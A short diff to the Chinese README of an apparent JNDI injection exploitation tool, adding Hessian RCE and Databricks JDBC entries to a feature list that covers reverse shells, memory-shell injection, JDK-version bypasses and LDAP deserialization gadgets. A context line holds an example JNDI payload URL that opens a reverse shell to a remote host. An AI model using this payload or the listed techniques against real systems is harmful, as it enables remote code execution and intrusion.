@@ -42,8 +42,9 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 - 内存马注入 (基于 [MemShellParty](https://github.com/ReaJason/MemShellParty))
 - 高版本 JDK 绕过
   - BeanFactory 绕过 (Tomcat/Groovy/XStream, etc.)
-  - JDBC RCE (MySQL/PostgreSQL/H2/Derby)
+  - JDBC RCE (MySQL/PostgreSQL/H2/Derby, etc.)
   - Tomcat Blind XXE
+  - Hessian RCE
 - LDAP 反序列化 (包含常用 Gadget)
 - Nashorn JS 自定义 JNDI Payload
 - LDAP trustSerialData 绕过
@@ -76,7 +77,9 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
   - [Apache Derby](USAGE.md#derby)
     - [Derby SQL RCE](USAGE.md#derby-sql-rce)
     - [Derby 主从复制反序列化 RCE](USAGE.md#derby-主从复制反序列化-rce)
+  - [Databricks](USAGE.md#databricks)
 - [Tomcat Blind XXE](USAGE.md#tomcat-blind-xxe)
+- [Hessian RCE](USAGE.md#hessian-rce)
 - [LDAP Deserialization](USAGE.md#ldap-deserialization)
   - [自定义数据反序列化](USAGE.md#自定义数据反序列化)
   - [CommonsCollections](USAGE.md#commonscollections)
